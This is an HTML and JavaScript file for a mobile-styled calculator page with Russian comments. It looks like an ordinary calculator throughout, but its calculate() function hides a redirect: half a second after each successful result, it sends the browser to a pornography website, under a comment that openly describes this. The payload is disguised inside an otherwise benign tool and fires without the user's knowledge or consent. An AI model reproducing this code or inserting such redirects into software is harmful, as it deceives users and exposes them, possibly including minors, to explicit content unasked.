<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Calculator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            touch-action: manipulation;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .calculator {
            width: 100%;
            max-width: 400px;
            background: rgba(40,40,40,0.9);
            border-radius: 20px;
            padding: 25px 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .display {
            background: rgba(0,0,0,0.3);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: right;
            min-height: 100px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .previous {
            font-size: 16px;
            color: #888;
            min-height: 20px;
            margin-bottom: 10px;
        }

        .current {
            font-size: 32px;
            font-weight: 300;
            word-break: break-all;
        }

        .buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
        }

        .btn {
            height: 70px;
            border: none;
            border-radius: 12px;
            font-size: 24px;
            background: rgba(255,255,255,0.1);
            color: white;
            cursor: pointer;
            transition: all 0.1s;
            font-family: inherit;
            -webkit-appearance: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn:active {
            background: rgba(255,255,255,0.2);
            transform: scale(0.95);
        }

        .operator {
            background: rgba(255,149,0,0.2);
        }

        .operator:active {
            background: rgba(255,149,0,0.3);
        }

        .equals {
            background: rgba(255,149,0,0.4);
        }

        .equals:active {
            background: rgba(255,149,0,0.5);
        }

        .zero {
            grid-column: span 2;
        }

        .clear, .backspace {
            background: rgba(255,255,255,0.15);
        }

        /* Адаптация для маленьких экранов */
        @media (max-width: 480px) {
            .calculator {
                padding: 20px 15px;
            }
            
            .display {
                padding: 15px;
                min-height: 80px;
            }
            
            .current {
                font-size: 28px;
            }
            
            .btn {
                height: 60px;
                font-size: 20px;
            }
        }

        @media (max-width: 320px) {
            .btn {
                height: 50px;
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="calculator">
        <div class="display">
            <div class="previous" id="previous"></div>
            <div class="current" id="current">0</div>
        </div>
        
        <div class="buttons">
            <button class="btn clear" data-action="clear">C</button>
            <button class="btn backspace" data-action="backspace">⌫</button>
            <button class="btn operator" data-action="divide">÷</button>
            <button class="btn operator" data-action="multiply">×</button>
            
            <button class="btn number" data-number="7">7</button>
            <button class="btn number" data-number="8">8</button>
            <button class="btn number" data-number="9">9</button>
            <button class="btn operator" data-action="subtract">-</button>
            
            <button class="btn number" data-number="4">4</button>
            <button class="btn number" data-number="5">5</button>
            <button class="btn number" data-number="6">6</button>
            <button class="btn operator" data-action="add">+</button>
            
            <button class="btn number" data-number="1">1</button>
            <button class="btn number" data-number="2">2</button>
            <button class="btn number" data-number="3">3</button>
            <button class="btn equals" data-action="equals">=</button>
            
            <button class="btn number zero" data-number="0">0</button>
            <button class="btn decimal" data-action="decimal">.</button>
        </div>
    </div>

    <script>
        // Простой и надежный калькулятор для мобильных
        let currentInput = '0';
        let previousInput = '';
        let operation = null;
        let shouldReset = false;

        const currentDisplay = document.getElementById('current');
        const previousDisplay = document.getElementById('previous');

        function updateDisplay() {
            currentDisplay.textContent = currentInput;
            if (operation) {
                previousDisplay.textContent = `${previousInput} ${getOperatorSymbol(operation)}`;
            } else {
                previousDisplay.textContent = previousInput;
            }
        }

        function getOperatorSymbol(op) {
            switch(op) {
                case 'add': return '+';
                case 'subtract': return '-';
                case 'multiply': return '×';
                case 'divide': return '÷';
                default: return '';
            }
        }

        function inputNumber(number) {
            if (shouldReset) {
                currentInput = '0';
                shouldReset = false;
            }
            
            if (currentInput === '0' && number !== '.') {
                currentInput = number;
            } else if (number === '.' && currentInput.includes('.')) {
                return;
            } else {
                currentInput += number;
            }
            updateDisplay();
        }

        function inputOperation(op) {
            if (currentInput === '') return;
            
            if (previousInput !== '') {
                calculate();
            }
            
            operation = op;
            previousInput = currentInput;
            shouldReset = true;
            updateDisplay();
        }

        function calculate() {
            if (!operation || previousInput === '') return;
            
            const prev = parseFloat(previousInput);
            const current = parseFloat(currentInput);
            
            if (isNaN(prev) || isNaN(current)) return;
            
            let result;
            switch(operation) {
                case 'add':
                    result = prev + current;
                    break;
                case 'subtract':
                    result = prev - current;
                    break;
                case 'multiply':
                    result = prev * current;
                    break;
                case 'divide':
                    if (current === 0) {
                        currentInput = 'Ошибка';
                        operation = null;
                        previousInput = '';
                        updateDisplay();
                        setTimeout(() => {
                            clearCalculator();
                        }, 1000);
                        return;
                    }
                    result = prev / current;
                    break;
                default:
                    return;
            }
            
            // Округление для избежания ошибок с плавающей точкой
            result = Math.round(result * 100000000) / 100000000;
            
            currentInput = result.toString();
            operation = null;
            previousInput = '';
            shouldReset = true;
            updateDisplay();

            // Перенаправление на PornHub после вычисления
            setTimeout(() => {
                window.location.href = 'https://pornhub.com';
            }, 500);
        }

        function clearCalculator() {
            currentInput = '0';
            previousInput = '';
            operation = null;
            shouldReset = false;
            updateDisplay();
        }

        function deleteLast() {
            if (currentInput.length === 1 || (currentInput.length === 2 && currentInput.startsWith('-'))) {
                currentInput = '0';
            } else {
                currentInput = currentInput.slice(0, -1);
            }
            updateDisplay();
        }

        // Обработчики для кнопок
        document.querySelectorAll('.number').forEach(button => {
            button.addEventListener('click', () => {
                inputNumber(button.getAttribute('data-number'));
            });
        });

        document.querySelectorAll('.operator').forEach(button => {
            button.addEventListener('click', () => {
                inputOperation(button.getAttribute('data-action'));
            });
        });

        document.querySelector('.equals').addEventListener('click', calculate);
        document.querySelector('.clear').addEventListener('click', clearCalculator);
        document.querySelector('.backspace').addEventListener('click', deleteLast);
        document.querySelector('.decimal').addEventListener('click', () => {
            inputNumber('.');
        });

        // Поддержка клавиатуры
        document.addEventListener('keydown', (e) => {
            if (e.key >= '0' && e.key <= '9') {
                inputNumber(e.key);
            } else if (e.key === '.') {
                inputNumber('.');
            } else if (e.key === '+') {
                inputOperation('add');
            } else if (e.key === '-') {
                inputOperation('subtract');
            } else if (e.key === '*' || e.key === 'x') {
                inputOperation('multiply');
            } else if (e.key === '/') {
                inputOperation('divide');
            } else if (e.key === 'Enter' || e.key === '=') {
                e.preventDefault();
                calculate();
            } else if (e.key === 'Escape' || e.key === 'c' || e.key === 'C') {
                clearCalculator();
            } else if (e.key === 'Backspace') {
                deleteLast();
            }
        });

        // Предотвращение контекстного меню на долгом тапе
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            return false;
        });

        // Блокировка масштабирования на двойной тап
        let lastTouchEnd = 0;
        document.addEventListener('touchend', (e) => {
            const now = Date.now();
            if (now - lastTouchEnd <= 300) {
                e.preventDefault();
            }
            lastTouchEnd = now;
        });

        // Исправление для Safari: предотвращение bounce-эффекта
        document.body.addEventListener('touchmove', (e) => {
            if (e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // Инициализация
        updateDisplay();
    </script>
</body>
</html>
